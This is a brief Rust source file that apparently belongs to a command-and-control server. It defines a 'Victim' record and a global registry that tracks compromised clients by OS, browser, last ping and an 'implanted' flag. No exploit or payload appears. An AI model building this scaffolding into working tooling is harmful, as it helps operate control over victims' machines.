use std::{collections::HashMap, sync::{Arc, Mutex}, time::Instant};
use tokio::sync::mpsc::Sender;

#[derive(Clone)]
pub struct Victim {
    pub id: usize,
    pub sender: Sender<String>,
    pub last_ping: Arc<Mutex<Instant>>,
    pub os: Arc<Mutex<Option<String>>>,
    pub browser: Arc<Mutex<Option<String>>>,
    pub implanted: Arc<Mutex<bool>>,
}

pub type Victims = Arc<Mutex<HashMap<usize, Victim>>>;

lazy_static::lazy_static! {
    pub static ref GLOBAL_VICTIMS: Victims = Arc::new(Mutex::new(HashMap::new()));
}
